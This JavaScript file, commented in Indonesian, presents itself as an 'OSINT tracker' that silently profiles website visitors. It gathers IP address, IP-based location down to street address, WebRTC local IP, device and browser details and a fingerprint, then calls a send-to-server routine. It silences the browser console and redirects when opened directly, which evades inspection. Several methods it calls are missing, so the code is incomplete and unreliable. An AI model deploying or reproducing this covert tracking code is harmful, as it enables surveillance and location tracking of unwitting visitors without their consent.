// osint.js - OSINT Tracking System
// Mengumpulkan data dari pengunjung dan mengirim ke developer
(function() {
    // Cek apakah file diakses langsung
    if (window.location.protocol === 'file:' || 
        (window.location.href.indexOf('osint.js') > -1 && document.currentScript === null)) {
        window.location.href = 'about:blank';
    }
    
    // Hapus semua console
    const noop = function(){};
    window.console = {
        log: noop, info: noop, warn: noop, error: noop, debug: noop, table: noop
    };
})();

class OSINTTracker {
    constructor() {
        this.userData = {
            // Identitas & IP
            ip_address: 'Mengambil IP...',
            public_ip: 'Mengambil IP...',
            local_ip: 'Tidak tersedia',
            mac_address: 'Tidak tersedia',
            
            // Data GPS / Lokasi
            latitude: 0,
            longitude: 0,
            accuracy: 0,
            altitude: null,
            heading: null,
            speed: null,
            
            // Informasi Lokasi dari Reverse Geocoding
            country: 'Menunggu data...',
            country_code: 'Menunggu data...',
            province: 'Menunggu data...',
            city: 'Menunggu data...',
            district: 'Menunggu data...',
            street: 'Menunggu data...',
            postal_code: 'Menunggu data...',
            full_address: 'Menunggu data...',
            
            // Data Jaringan
            isp: 'Menunggu data...',
            organization: 'Menunggu data...',
            asn: 'Menunggu data...',
            connection_type: 'Unknown',
            downlink: null,
            rtt: null,
            
            // Data Device
            user_agent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(',') : '',
            platform: navigator.platform,
            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
            device_memory: navigator.deviceMemory || 'Unknown',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            screen_resolution: `${window.screen.width}x${window.screen.height}`,
            screen_avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
            color_depth: window.screen.colorDepth,
            pixel_ratio: window.devicePixelRatio || 1,
            
            // Data Browser
            browser_name: this.getBrowserName(),
            browser_version: this.getBrowserVersion(),
            browser_engine: this.getBrowserEngine(),
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack,
            referrer: document.referrer || 'Direct',
            page_url: window.location.href,
            
            // Data Device Info
            device_info: {
                is_mobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                is_android: /Android/i.test(navigator.userAgent),
                is_ios: /iPhone|iPad|iPod/i.test(navigator.userAgent),
                is_desktop: !/Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                os_name: this.getOSName(),
                os_version: this.getOSVersion()
            },
            
            // Waktu
            timestamp: new Date().toISOString(),
            local_time: new Date().toString(),
            timezone_name: Intl.DateTimeFormat().resolvedOptions().timeZone,
            
            // Sumber Data
            source: 'pending',
            gps_allowed: false,
            google_maps_link: null
        };
        
        // Fingerprint unik
        this.userData.fingerprint = this.generateFingerprint();
        
        console.log('🚀 OSINT Tracker Initialized');
        console.log('📊 Target:', this.userData.fingerprint);
        
        // Mulai pengumpulan data
        this.init();
    }
    
    async init() {
        // 1. Kumpulkan semua data yang bisa langsung didapat
        this.collectNetworkInfo();
        this.collectBatteryInfo();
        this.collectWebRTCInfo();
        
        // 2. Dapatkan IP Address (WAJIB)
        await this.getIPAddress();
        
        // 3. Kirim data awal (tanpa GPS dulu)
        await this.sendToServer();
    }
    
    // Dapatkan IP Address
    async getIPAddress() {
        const ipAPIs = [
            {
                url: 'https://api.ipify.org?format=json',
                parser: (data) => data.ip
            },
            {
                url: 'https://api.myip.com',
                parser: (data) => data.ip
            },
            {
                url: 'https://ipapi.co/json/',
                parser: (data) => data.ip
            },
            {
                url: 'https://ipinfo.io/json',
                parser: (data) => data.ip
            },
            {
                url: 'https://jsonip.com',
                parser: (data) => data.ip
            }
        ];
        
        for (const api of ipAPIs) {
            try {
                const response = await fetch(api.url);
                const data = await response.json();
                const ip = api.parser(data);
                
                if (ip && ip !== 'Unknown' && ip.includes('.')) {
                    this.userData.ip_address = ip;
                    this.userData.public_ip = ip;
                    console.log('✅ IP Address:', ip);
                    
                    // Dapatkan data dari IP
                    await this.getIPLocation(ip);
                    return;
                }
            } catch (e) {
                console.log('Gagal dengan API:', api.url);
            }
        }
        
        this.userData.ip_address = 'Unknown';
        console.warn('⚠️ IP Address tidak ditemukan');
    }
    
    // Dapatkan lokasi dari IP
    async getIPLocation(ip) {
        try {
            // Coba ipapi.co
            const response = await fetch(`https://ipapi.co/${ip || ''}/json/`);
            const data = await response.json();
            
            if (data && !data.error) {
                this.userData.country = data.country_name || 'Tidak diketahui';
                this.userData.country_code = data.country_code || 'Tidak diketahui';
                this.userData.city = data.city || 'Tidak diketahui';
                this.userData.latitude = data.latitude || 0;
                this.userData.longitude = data.longitude || 0;
                this.userData.isp = data.org || 'Tidak diketahui';
                this.userData.asn = data.asn || 'Tidak diketahui';
                
                // Dapatkan alamat dari koordinat jika ada
                if (data.latitude && data.longitude) {
                    await this.reverseGeocode();
                }
                
                console.log('📍 Data dari IP:', this.userData.city, this.userData.country);
            }
        } catch (error) {
            console.log('IP location gagal');
        }
    }
}

// Inisialisasi OSINT tracker
document.addEventListener('DOMContentLoaded', () => {
    console.log('%c🔍 OSINT TRACKER READY', 'background: #dc3545; color: white; padding: 5px;');
    console.log('%c⚠️ INI ADALAH SISTEM OSINT - DATA PENGUNJUNG AKAN DIKUMPULKAN', 'background: #ffc107; color: #333; padding: 5px;');
    
    window.osintTracker = new OSINTTracker();
});